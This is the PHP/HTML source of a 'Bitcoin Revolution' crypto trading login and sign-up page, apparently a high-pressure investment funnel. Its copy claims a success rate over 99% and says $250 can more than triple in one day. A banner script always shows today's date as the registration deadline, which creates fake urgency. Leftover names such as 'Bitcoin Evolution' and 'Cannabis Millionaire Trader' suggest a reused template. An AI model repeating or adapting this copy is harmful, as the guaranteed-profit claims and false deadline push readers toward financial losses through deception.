<?php
	include('../helpers/country_info.php')
?>

<!DOCTYPE html>
 <html data-wf-page="5e7cbd037227787b827e077c" data-wf-site="5e71ba6688922632b0a126d3" lang="en-US"><head>
  <meta charset="utf-8">
  <meta name="isoCode" content="<?php echo strtolower($country->isoCode) ?>">   
  <title>Login and Start Trading | Bitcoin Revolution</title>
  <meta name="description" content="You don't have to be a financial expert to use cutting-edge investment technology and make money trading Bitcoin. Our automated app does it all">
  <script>
  window.funnel = {
      config: {
          funnelCode: 'NEW-TH-BTCNRVLTN',
          lang: 'en-US'
      }
  };
</script>
<meta property="og:image" content="../assets/Bitcoin.jpg"/>
<meta property="og:image:width" content="445"/>
<meta property="og:image:height" content="300"/>
<script src="https://kit.fontawesome.com/a5598cee1d.js" crossorigin="anonymous"></script>
<link rel="alternate" hreflang="en" href="https://bitcoinrevolution.ai/" />
<link rel="canonical" href = "https://bitcoinrevolution.ai"/>
<link rel="alternate" hreflang="de" href="https://bitcoinrevolution.ai/de/account-login" />
<link rel="alternate" hreflang="es" href="https://bitcoinrevolution.ai/es/account-login" />
<link rel="alternate" hreflang="pl" href="https://bitcoinrevolution.ai/pl/account-login" />
<meta property="og:locale" content="en_GB"/>
<meta property="og:type" content="website"/>
<meta property="og:title" content="Login and start trading | Bitcoin Revolution"/>
<meta property="og:description" content=" You don't have to be a financial expert to use cutting-edge investment technology and make money trading Bitcoin. Our automated app does it all."/>
<meta property="og:url" content="https://bitcoinrevolution.ai/account-login/"/>
<meta property="og:image" content="../favicon.ico"/>
<meta property="og:image:width" content="100"/>
<meta property="og:image:height" content="100"/>
  <script>
    var lang = 'en';
    var today = new Date();
    var dd = String(today.getDate()).padStart(2, '0');
    var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
    var yyyy = today.getFullYear();
    today = mm + '/' + dd + '/' + yyyy;
    </script>
    <?php 
        /*** Google Tag Manager ***/
        include('../helpers/gtm.php');
    ?>
</head>
<body class="body-4">

  <div class="html-embed-6 w-embed w-script">
   
  </div>
  <section class="warning">
    <div class="div-block">
      <p class="paragraph-9"><strong>WARNING: Due to extremely high media demand, we will close registration as of <script>document.write(today)</script> - HURRY!</p>
    </div>
  </section>
  <header class="header">
    <div class="container w-container">
      <div class="main-header-wrap"><a href="../" aria-current="page" class="link-block w-inline-block w--current"><img src="../assets/logo.png" alt="logo-image" class="logo"></a>
      <div class="exclusive-offer">
          <div class="exclusive-text"><span>Exclusive offer for </span><span class="text-span exc-2">trades</span> <span class="text-span-6">in</span> <span class="country-name">your country</span></div>
          <div class="exclusive-flag flag-icon" id="flag-head"></div> 
        </div>
        <div class="div-block-5 lang-box">
          <div data-delay="0"class="dropdown w-dropdown" onclick="getLang()">
            <div class="dropdown-toggle w-dropdown-toggle"><img src="../assets/us.png" width="21" height="16" alt="en" srcset="../assets/us-p-500.png 500w, ../assets/us.png 640w" sizes="20px" class="image-3">
              <div class="text-block-5">En</div>
              <div class="icon w-icon-dropdown-toggle"><i class="fa fa-long-arrow-down" aria-hidden="true"></i></div>
            </div>
            <nav class="dropdown-list w-dropdown-list" id="aas">
            <div class="div-block-32"><a href="https://bitcoinrevolution.ai/de/" hreflang="de"><img width="20" src="../assets/de.png" alt="de-lang" class="image-11"><a href="?lp=1" class="dropdown-link w-dropdown-link">German</a></div>
              <div class="div-block-32"><a href="https://bitcoinrevolution.ai/es/" hreflang="es"><img width="20" src="../assets/es.png" alt="es-lang" srcset="../assets/es-p-500.png 500w, ../assets/es.png 640w" sizes="100vw" alt class="image-11"><a href="?lp=1" class="dropdown-link w-dropdown-link">Spanish</a></div>
              <div class="div-block-32"><a href="https://bitcoinrevolution.ai/pl/" hreflang="pl"><img width="20" src="../assets/pl.svg" alt="pl-lang" class="image-11"><a href="?lp=1" class="dropdown-link w-dropdown-link">Polish</a></div>      </nav>
         </div>
             </div>
      </div>
    </div>
  </header>
  <section class="main-title">
    <div class="container">
      <section class="section-2 main">
        <h1 class="login-main-title">Bitcoin revolution login</h1>
      </section>
    </div>
  </section>
  <section class="login">
    <div class="container">
      <section class="section-2">
        <h2 class="heading welcome">The Exchange Market’s Leading Automated Trading App</h2>
      </section>
      <div class="form-block w-form">
        <form data-name="login-form" name="wf-form-login-form" class="login-form">
          <div class="w-row">
            <div class="w-col w-col-4">
              <div class="form-group"><input type="text" class="form-control form-control-bg email-control w-input" maxlength="256" name="FunnelLoginForm[email]" data-name="FunnelLoginForm[email]" placeholder="Email">
                <div class="warning-icon"></div>
              </div>
            </div>
            <div class="w-col w-col-4">
              <div class="form-group"><input type="password" class="form-control form-control-bg pass-control w-input" maxlength="256" name="FunnelLoginForm[password]" data-name="FunnelLoginForm[password]" placeholder="Password">
            </div>
                <div class="warning-icon"></div>
              </div>
              <div class="w-col w-col-4"><input type="submit" value="Login" data-wait="Please wait..." class="btn btn-login btn-blue w-button"></div>
            </div>
           
        </form>
        <div class="w-form-done">
          <div>Thank you! Your submission has been received!</div>
        </div>
        <div class="w-form-fail">
          <div>Oops! Something went wrong while submitting the form.</div>
        </div>
      </div>
      <p class="login-ph text-last-center">Who said you have to be a seasoned Wall Street broker in order to get rich on the foreign exchange market? Gaining capital has never been easier thanks to Bitcoin Revolution, the most accurate cryptocurrency trading app in the industry. Login into your account and start trading.
      </p>
      <p class="login-ph text-last-center">You don't have to be a financial expert to use cutting-edge investment technology and make money trading Bitcoin. Our automated app does it all for you by analyzing the foreign exchange market and identifying the most lucrative buying and selling points. All you have to do is sit back, relax, and watch your fortune come in.</p>
      <p class="login-ph text-last-center">As far as the initial investment is concerned, you don’t need to be rich to start trading with Bitcoin Revolution. By funding your account with as little as $250 to begin with, you can get back more than triple the amount in profits in just one day.</p>

    </div>
  </section>
  <section class="get-access">
    <div class="container">
      <h2 class="still-title">Join the Bitcoin Revolution?</h2>
      <p class="still-subtitle">Sign up and start your profitable and exciting crypto adventure!</p><a href="?lp=1" class="btn btn-blue w-button">SIGN UP</a></div>
  </section>
  <section class="login-process">
    <div class="container w-clearfix">
      <img src="../assets/tablet.png" alt="tablet" class="login-img-right">
      <p class="login-process-ph">There are certainly many pros to trading, but what about the cons? Human errors are perhaps the most notable drawback when it comes to trading any type of currency. Stories of accomplished and competent traders going broke after one rash decision or ill-advised investment are unfortunately quite common when it comes to forex.
      </p>
      <p class="login-process-ph">However, you don’t need to worry about life-altering mistakes when using the Bitcoin Revolution. The app and software our website operates on were developed by a team of financial experts and professional programmers to ensure accurate results every time. With the highest success rate on the market of over 99%, Bitcoin Revolution is your one way ticket to an affluent life where no luxury will be out of your reach.
      </p>
      <p class="login-process-ph">Join Bitcoin Revolution today and get ahead on the path towards authentic financial freedom!
      </p>
       <div class="break"></div><img src="../assets/notebook_1.png" alt="notebook" class="login-img-left">
      <h3 class="login-process-subtitle">Contact Us</h3>
      <p class="login-process-ph">You will never walk alone in crypto land when trading with the Bitcoin Revolution. Our customer support team is friendly, professional and is available to help you. Get in touch with the team instantly by filling out the ‘Contact Us’ form on this page.</p>
      <p class="login-process-ph">At Bitcoin Evolution, we value customer feedback. This also extends to our brokerage partners, whom we carefully selected so that investors can gain maximum value for their starting capital. All the brokers run their own excellent customer support teams, but we are always ready to help our investors with our own team as well.
      </p>
</section>
  <section class="risk"><h3>Risk Note</h3>
<p>Trading has the potential to be a highly profitable activity when pursued correctly. However, initial investors are advised to keep in mind that it also involves the risk of partial or total capital loss. Therefore, we first of all strongly recommend you to thoroughly read our disclaimer, as well as the Bitcoin Revolution terms and conditions before funding your account and making any transactions.</p>
<p>Second of all, we advise you to consider your country’s capital gain tax liability. Soliciting United States citizens to purchase and trade commodity options is illegal unless they are listed on a CFTC-registered exchange or otherwise legally exempt.  </p>
</section>
 
<div id="footer" class="footer">
    <div class="container w-container">
      <div data-collapse="none" data-animation="default" data-duration="400" role="banner" class="navbar-2 w-nav">
        <nav role="navigation" class="nav-menu-2 w-nav-menu">
          <a href="./" class="nav-link-4 w-nav-link">Login</a>
          <a href="../about-us/" class="nav-link-4 w-nav-link">About us</a>
          <a href="../terms-conditions/" class="nav-link-5 w-nav-link">Terms and conditions</a><a href="../privacy-policy" class="nav-link-6 w-nav-link">Privacy Policy</a>
          <a href="../privacy-policy/" class="nav-link-6 w-nav-link">cookie policy</a>
        <a href="../contact-us/" class="nav-link-6 w-nav-link">contact us</a>
        <a href="../legit-or-scam/" class="nav-link-6 w-nav-link">Bitcoin Revolution Scam</a></nav>
      </div><a href="../" aria-current="page" class="w-inline-block w--current"><img src="../assets/logo.png" alt="Cannabis Millionaire Trader" class="image-8"></a></div>
  </div>
 
</body>
<script>
  window.setFlagIcon = function (countryCode){
    $('.exclusive-offer .flag-icon').addClass('flag-icon-'+countryCode.toLowerCase()).addClass('show');
  }
  $(document).ready(function() { 
    $(this).find('html').attr('lang', lang.substr(0,2));
  })
  document.addEventListener('geoInitialized', function (e) {
 console.log(e);
         window.setFlagIcon(e.detail.country.code);
});         
</script>

<script>
  
(function($){
  let accordion = $('.accordion-item');
  let contentClass = '.dropdown-list-2';
  let signClass = '.paragraph-25';
  let degreeClosed = 135;
  let degreeOpened = 315;
  accordion.on('click',function(e){
  	e.preventDefault();
    let content = $(this).find(contentClass);
    let sign = $(this).find(signClass);
    if(content.get(0).style.display == "none" || !content.get(0).style.display){
    	accordion.parent().find(contentClass).each(function(i,c){
      	$(c).slideUp('fast');
      });
      accordion.parent().find(signClass).each(function(i,s){
      	rotate($(s),degreeClosed);
      });
      content.slideDown('fast');
      rotate(sign,degreeOpened);
    } else {
    	rotate(sign,degreeClosed);
    	content.slideUp('fast');
    }
  });
  function rotate($el, degrees) {
    $el.css({
    '-webkit-transform' : 'rotate('+degrees+'deg)',
       '-moz-transform' : 'rotate('+degrees+'deg)',  
        '-ms-transform' : 'rotate('+degrees+'deg)',  
         '-o-transform' : 'rotate('+degrees+'deg)',  
            'transform' : 'rotate('+degrees+'deg)',  
                 'zoom' : 1
      });
  }
})(jQuery);

function getLang() { 
    $('#aas').slideDown('slow')
  }
  document.getElementById('flag-head').style.backgroundImage = `url('./assets/flags/<?php echo strtoupper($country->isoCode) ?>.PNG')`;

</script>

</html>